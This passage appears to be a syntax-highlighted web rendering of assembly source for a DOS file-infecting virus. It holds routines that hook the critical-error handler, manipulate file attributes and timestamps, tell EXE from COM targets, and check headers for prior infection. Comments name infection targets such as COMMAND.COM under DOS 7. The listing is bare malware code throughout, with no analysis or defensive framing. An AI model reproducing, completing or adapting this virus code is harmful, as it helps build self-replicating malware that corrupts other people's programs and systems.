         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">06c7h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0090h</span><span class="sc0">
         </span><span class="sc5">TRAPPED_24</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                      </span><span class="sc1">; mov ds:[90h],cs:TRAPPED_24</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">dos_handler</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">critical</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">critical</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">openfile</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc1">;  mov  ax,3d02h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">                                             </span><span class="sc1">; out : BX handle</span><span class="sc0">

</span><span class="sc5">openFile</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">closeFile</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                                      </span><span class="sc1">; in  : BX handle</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">closefile</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetFAttrib</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc1">;   mov ax,4300h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                              </span><span class="sc1">; CX attributo</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc1">; mov ax,4301h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">out_f</span><span class="sc0">
       </span><span class="sc1">;  mov ax,4301h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
</span><span class="sc5">out_f</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                   </span><span class="sc1">; ritorna CX attributo</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">                                      </span><span class="sc1">; ritona carry se errore</span><span class="sc0">

</span><span class="sc5">SetFattrib</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                  </span><span class="sc1">; in CX attributo</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc1">;  mov ax,4301h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SetFattrib</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetFAttrib</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FileEnd</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc1">;   mov ax,4202h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                    </span><span class="sc1">; DX:AX file size</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FileEnd</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Filestart</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">Filestart</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FileSeek</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FileSeek</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">blockread</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">blockread</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">blockwrite</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">blockwrite</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetDateTime</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc1">;   mov ax,5700h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">searchrec.date</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">searchrec.time</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetdateTime</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SetDateTime</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">searchrec.date</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">searchrec.time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc1">;  mov ax,5701h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int21h</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SetdateTime</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">commit_file</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                                        </span><span class="sc1">; commit file</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">commit_file</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">clean_x_stack</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">searchstack</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">searchstack</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">           </span><span class="sc6">stosd</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">clean_x_stack</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">CheckIfExe</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">                                 </span><span class="sc1">; DS:DX filename</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                           </span><span class="sc1">; ES:DI filename</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">FindZ</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">FindZ</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'exe.'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">is_exe</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'EXE.'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">is_exe</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'moc.'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">is_exe</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'MOC.'</span><span class="sc0">

</span><span class="sc5">is_exe</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CheckIfExe</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">PushHandle</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">

          </span><span class="sc6">pushf</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SearchStack</span><span class="sc0">            </span><span class="sc1">; ES:DI SearchStack</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">maxfiles</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">repnz</span><span class="sc0">         </span><span class="sc6">scasw</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">Nofree</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">; sets handle</span><span class="sc0">

</span><span class="sc5">Nofree</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">popf</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">PushHandle</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">PopHandle</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

          </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">Nofree1</span><span class="sc0">                              </span><span class="sc1">; BX = 0 ?</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">

          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SearchStack</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">maxfiles</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">repnz</span><span class="sc0">         </span><span class="sc6">scasw</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Nofree1</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">; free handle</span><span class="sc0">
          </span><span class="sc6">clc</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">exitpop</span><span class="sc0">

</span><span class="sc5">Nofree1</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc5">Exitpop</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">PopHandle</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">Calc_check</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                                     </span><span class="sc1">; DS = CS</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">fileheader</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">@chk</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fileheader</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@chk</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                                      </span><span class="sc1">; DX = checksum</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Calc_check</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">CheckXinf</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">file_status</span><span class="sc4">,</span><span class="sc5">already</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Filestart</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">Fileheader</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fileheader</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BlockRead</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">MZsig</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">fileheader.signature</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">IsanExe</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ZMsig</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">fileheader.signature</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; vede se e' un file EXE</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsanExe</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">file_type</span><span class="sc4">,</span><span class="sc5">com</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileEnd</span><span class="sc0">                             </span><span class="sc1">; DX:AX dim file</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VIR_TRUE_LEN</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">NONCRYPTED</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">START_TSR</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">fileheader.signature</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">GotoEnd</span><span class="sc0">                               </span><span class="sc1">; infected</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Except</span><span class="sc0">

</span><span class="sc5">IsAnExe</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">file_type</span><span class="sc4">,</span><span class="sc5">exe</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">fileheader.Checksum</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
             </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@good</span><span class="sc0">                        </span><span class="sc1">; not a PE,NE,LE ....</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">file_type</span><span class="sc4">,</span><span class="sc5">other</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GotoEnd</span><span class="sc0">

</span><span class="sc5">@good</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calc_check</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">fileheader.CheckOvr</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">GoToEnd</span><span class="sc0">                             </span><span class="sc1">; already infected</span><span class="sc0">

</span><span class="sc5">Cont</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileEnd</span><span class="sc0">                           </span><span class="sc1">; DX:AX dimens file</span><span class="sc0">

         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">fileheader.msize</span><span class="sc0">
         </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">fileheader.sizemod</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; malloc = filesize</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Except</span><span class="sc0">

</span><span class="sc1">;//**** SFT and JFT doesnt work in dos7 prompt from w95 :((        ****** ///</span><span class="sc0">
</span><span class="sc1">;//**** This is used for infecting COMMAND.COM under dos7 which is not a .COM</span><span class="sc0">
</span><span class="sc1">;//**** file but a real EXE</span><span class="sc0">

</span><span class="sc5">Chk_Com</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">                                </span><span class="sc1">; BX handle</span><span class="sc0">
